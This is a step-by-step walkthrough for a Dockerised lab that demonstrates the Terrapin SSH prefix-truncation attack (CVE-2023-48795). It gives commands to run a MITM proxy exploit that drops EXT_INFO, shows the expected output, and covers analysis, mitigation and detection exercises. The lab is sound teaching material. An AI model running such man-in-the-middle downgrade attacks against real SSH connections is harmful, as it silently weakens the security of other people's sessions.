# Terrapin Attack - LAB WALKTHROUGH

This document provides a step-by-step walkthrough of the Terrapin attack demonstration lab.

## Prerequisites

- Docker and Docker Compose installed
- Basic understanding of SSH protocol
- Terminal/command line familiarity
- At least 2GB free RAM

## Lab Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    Docker Network                        │
│                    (172.20.0.0/24)                      │
│                                                          │
│  ┌──────────────┐      ┌──────────────┐               │
│  │   Client     │      │   Attacker   │               │
│  │  172.20.0.30 │─────▶│  172.20.0.20 │               │
│  │              │      │   (MITM)     │               │
│  └──────────────┘      └──────┬───────┘               │
│                               │                          │
│                               │                          │
│                               ▼                          │
│                      ┌──────────────┐                   │
│                      │ Vulnerable   │                   │
│                      │   Server     │                   │
│                      │ 172.20.0.10  │                   │
│                      └──────────────┘                   │
└─────────────────────────────────────────────────────────┘
```

## Part 1: Environment Setup

### Step 1: Build the Lab

```bash
cd terapin
docker-compose build
```

This will build three containers:
- **vulnerable-server**: SSH server with vulnerable configuration
- **attacker**: MITM attacker with exploit tools
- **client**: SSH client for testing

### Step 2: Start the Lab

```bash
docker-compose up -d
```

### Step 3: Verify Containers

```bash
docker-compose ps
```

You should see three containers running:
```
NAME                        STATUS
terrapin-attacker          Up
terrapin-client            Up
terrapin-vulnerable-server Up
```

## Part 2: Vulnerability Verification

### Step 4: Check Server Vulnerability

From your host machine:

```bash
docker exec -it terrapin-attacker python3 /attack/demo/verify_vulnerability.py --host vulnerable-server --port 22
```

Expected output:
```
[*] Checking vulnerable-server:22
[+] Server is reachable
[+] SSH Version: SSH-2.0-OpenSSH_...

Encryption Algorithms:
  ⚠️  VULNERABLE chacha20-poly1305@openssh.com
  ✓ aes128-ctr

🎯 VERDICT: VULNERABLE to Terrapin Attack
```

## Part 3: Normal SSH Connection (Baseline)

### Step 5: Test Normal Connection

Connect directly to the vulnerable server (without MITM):

```bash
docker exec -it terrapin-client python3 /client/test_client.py --host vulnerable-server --port 22
```

This establishes a normal SSH connection. Note the connection details displayed.

## Part 4: Terrapin Attack Execution

### Step 6: Setup MITM Environment

Open a terminal to the attacker container:

```bash
docker exec -it terrapin-attacker /bin/bash
```

Inside the attacker container:

```bash
cd /attack
./mitm_setup.sh
```

This configures IP forwarding and network rules.

### Step 7: Start Packet Capture

In the attacker container (same terminal or new one):

```bash
docker exec -it terrapin-attacker tcpdump -i any -w /attack/captures/attack.pcap port 22
```

Leave this running in the background or in a separate terminal.

### Step 8: Start Attack Proxy

In another terminal to the attacker container:

```bash
docker exec -it terrapin-attacker bash
cd /attack
python3 poc_exploit/terrapin_exploit.py --target vulnerable-server --port 22 --proxy-port 2222 --verbose
```

Expected output:
```
╔════════════════════════════════════════════════════════════╗
║           TERRAPIN ATTACK - PROOF OF CONCEPT              ║
║                   CVE-2023-48795                          ║
╚════════════════════════════════════════════════════════════╝

[*] Checking vulnerable-server:22
[+] Server banner: SSH-2.0-OpenSSH_...
✓ Server supports vulnerable cipher suites
✓ Server supports ext-info
🎯 Server is VULNERABLE to Terrapin attack!

[*] Starting Terrapin attack...
[*] Waiting for client connection on port 2222...
```

### Step 9: Connect Through Attack Proxy

In a NEW terminal, from the client container:

```bash
docker exec -it terrapin-client python3 /client/test_client.py --host attacker --port 2222
```

### Step 10: Observe the Attack

Back in the attacker terminal, you should see:

```
[+] Client connected from ...
[+] Connected to target server vulnerable-server:22
[*] Starting client->server forwarding
[*] Starting server->client forwarding
🔑 Server sent SSH_MSG_NEWKEYS
🎯 DROPPING SSH_MSG_EXT_INFO from server!
```

The connection will still succeed, but the EXT_INFO packet was dropped!

### Step 11: Stop Packet Capture

Stop the tcpdump capture (Ctrl+C) and note the capture file location.

## Part 5: Analysis

### Step 12: Analyze Capture

```bash
docker exec -it terrapin-attacker python3 /attack/demo/capture_analysis.py /attack/captures/attack.pcap
```

This will show:
- Number of SSH packets
- Messages types detected
- **Attack indicators** (missing EXT_INFO after NEWKEYS)

### Step 13: Detailed Packet Analysis (Optional)

If you want to see detailed packet information:

```bash
docker exec -it terrapin-attacker tshark -r /attack/captures/attack.pcap -Y 'ssh' -V | less
```

## Part 6: Understanding the Attack

### What Happened?

1. **Client initiated connection** through the attacker's proxy (port 2222)
2. **Attacker forwarded** initial handshake between client and server
3. **Key exchange occurred** with both parties negotiating encryption
4. **SSH_MSG_NEWKEYS** was sent (signaling encryption start)
5. **SSH_MSG_EXT_INFO** was sent next (sequence 0 after NEWKEYS)
6. **Attacker DROPPED** the EXT_INFO packet
7. **Connection continued** without either side detecting the drop
8. **Security extensions** were not activated

### Why is This Dangerous?

- **Extension Downgrade**: Security features in EXT_INFO are disabled
- **Integrity Bypass**: SSH didn't detect the packet drop
- **Attack Surface**: Opens potential for other attacks
- **Silent Failure**: Connection appears normal to both parties

### Why Did It Work?

The attack succeeds because:

1. **Sequence Number Reset**: After NEWKEYS, counter resets to 0
2. **No Transcript Hash**: EXT_INFO not in key exchange hash
3. **Predictable Timing**: EXT_INFO always follows NEWKEYS
4. **Vulnerable Cipher**: ChaCha20-Poly1305 makes packet identification easy

## Part 7: Mitigation Verification

### Step 14: Test Patched Configuration (Simulation)

To see how a patched server would behave, you would need:

1. **OpenSSH 9.6+** with strict kex
2. **Updated cipher configuration**
3. **Strict sequence checking**

The attack would fail because:
- Server detects missing sequence number
- Terminates connection immediately
- Logs security event

## Part 8: Cleanup

### Step 15: Stop the Lab

```bash
docker-compose down
```

### Step 16: Remove Volumes (Optional)

```bash
docker-compose down -v
```

## Common Issues and Troubleshooting

### Issue: Containers Won't Start

**Solution**: Check if ports are already in use
```bash
netstat -an | grep -E "2222|3333"
docker ps
```

### Issue: Attack Doesn't Work

**Checklist**:
- [ ] Is the server actually vulnerable? (Run verify_vulnerability.py)
- [ ] Is IP forwarding enabled in attacker? (Check mitm_setup.sh)
- [ ] Is client connecting to attacker, not server?
- [ ] Are you running the proxy with --verbose to see details?

### Issue: Can't See Packets in tcpdump

**Solution**: Make sure:
- tcpdump is running BEFORE starting the connection
- You're capturing on the right interface (`-i any`)
- You have appropriate permissions (container runs as root)

## Advanced Exercises

### Exercise 1: Modify the Attack

Try modifying `terrapin_exploit.py` to:
- Drop different packets
- Inject custom packets
- Modify KEXINIT parameters

### Exercise 2: Detection Script

Write a script that detects the attack in real-time by:
- Monitoring sequence numbers
- Checking for EXT_INFO after NEWKEYS
- Alerting on anomalies

### Exercise 3: Different Ciphers

Modify `sshd_config` to:
- Use only CBC ciphers
- Test different combinations
- See which ones are vulnerable

## Security Considerations

⚠️ **CRITICAL REMINDERS**:

1. **Only use in isolated lab environment**
2. **Never run against production systems**
3. **Always have written authorization**
4. **Understand legal implications**

## Additional Resources

- **Original Research**: https://terrapin-attack.com
- **CVE Details**: CVE-2023-48795
- **OpenSSH Security**: https://www.openssh.com/security.html
- **RFC 4253**: SSH Protocol specification

## Summary

You have successfully:
- ✅ Built a vulnerable SSH environment
- ✅ Verified the vulnerability
- ✅ Executed the Terrapin attack
- ✅ Analyzed the attack traffic
- ✅ Understood the attack mechanism

This lab demonstrates a real vulnerability in SSH that affects many implementations. Always keep your SSH software updated and follow security best practices!

---

**Questions or issues?** Check the main [README.md](README.md) or open an issue on GitHub.
